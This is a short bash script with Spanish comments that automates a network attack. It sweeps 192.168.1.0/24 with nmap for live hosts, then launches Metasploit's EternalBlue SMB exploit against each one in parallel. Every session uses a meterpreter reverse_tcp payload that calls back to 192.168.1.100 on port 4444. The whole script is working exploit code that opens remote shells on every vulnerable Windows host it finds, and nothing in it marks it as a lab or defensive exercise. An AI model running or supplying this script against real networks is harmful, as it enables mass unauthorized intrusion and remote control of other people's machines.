#!/bin/bash

# Escanear la red en busca de hosts activos en un rango de IPs
echo "[+] Escaneando la red 192.168.1.0/24..."
nmap -sn 192.168.1.0/24 -oG network_scan.txt

# Extraer las IPs de los hosts activos
grep "Up" network_scan.txt | awk '{print $2}' > live_hosts.txt

# Ejecutar el ataque en paralelo para cada host activo
echo "[+] Ejecutando explotación en paralelo..."
cat live_hosts.txt | while read -r ip; do
    echo "Atacando $ip..."
    msfconsole -q -x "
    use exploit/windows/smb/ms17_010_eternalblue;
    set RHOST $ip;
    set PAYLOAD windows/x64/meterpreter/reverse_tcp;
    set LHOST 192.168.1.100;
    set LPORT 4444;
    exploit;
    exit;" &
done

wait
echo "[+] Explotación completada para todos los hosts activos."
